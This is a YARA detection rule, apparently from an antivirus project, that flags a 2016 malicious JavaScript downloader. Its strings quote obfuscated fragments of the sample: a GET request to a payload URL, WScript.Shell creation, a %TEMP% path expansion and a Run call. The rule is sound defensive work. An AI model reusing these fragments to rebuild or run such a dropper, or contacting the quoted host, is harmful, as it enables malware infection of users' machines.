rule sig_20160427_a602870f5994ff84e49d5a051dc29992 {
  meta:
    description = "datamaliciousorder - file 20160427_a602870f5994ff84e49d5a051dc29992.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d34d1537212a49c9622efa3db46c13801065c478c2f7a4c954965e36223c3ca2"

  strings:
    $s1  = "MgzxgUjvrn[IvbuvCcmtr](\"G\" + \"ET\", \"http://pediatriayvacunas.com/q0wps\", false);" fullword ascii
    $s2  = "function GihqkEhwkj() {return ZmmebLllpi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ndkBrr1" ascii
    $s3  = "function GihqkEhwkj() {return ZmmebLllpi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ndkBrr1" ascii
    $s4  = "function HijnnIwcml(AnkohIrnhm, NubrwSfdtf){GrvrmDehdo = GrvrmDehdo * 1; return AnkohIrnhm - NubrwSfdtf;};" fullword ascii
    $s5  = "var HutatMeozh = this[\"WScript\"];" fullword ascii
    $s6  = "var ZmmebLllpi = function TbdncAfvbb() {return HutatMeozh[CpkyoCnqkf](\"WScript\"+\".Shell\");}(), RiqpnVfykj = 11;" fullword ascii
    $s7  = "if (MgzxgUjvrn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function AdlaiZwchm(){return UwgqvWwmtj + \"\";};" fullword ascii
    $s9  = "function MjbllCehtj() {return ((VzzheJioty == true) && (VzzheJioty == FchzcBcihj)) ? 1 : GrvrmDehdo;};" fullword ascii
    $s10 = "function UbpwtKztur(QbefnTjsbt) {var IrvyjVhuwo = (1, 2, 3, 4, 5, QbefnTjsbt); return IrvyjVhuwo;};" fullword ascii
    $s11 = "function QlfddZzspw(ZytxzTuerx){ZmmebLllpi[\"R\"+\"un\"](ZytxzTuerx, GrvrmDehdo, GrvrmDehdo);};" fullword ascii
    $s12 = "return HijnnIwcml(MzxqwElzjl, VyzfyAnvbo);" fullword ascii
    $s13 = "HrpiiUvyvk = true;" fullword ascii
    $s14 = "var HrpiiUvyvk = false;" fullword ascii
    $s15 = "}while (DczbwCbnpr);" fullword ascii
    $s16 = "var OuyhuVjdxt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "VzzheJioty = true; " fullword ascii
    $s18 = "FchzcBcihj = true; " fullword ascii
    $s19 = "function GreixXsaeu()" fullword ascii
    $s20 = "var FchzcBcihj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}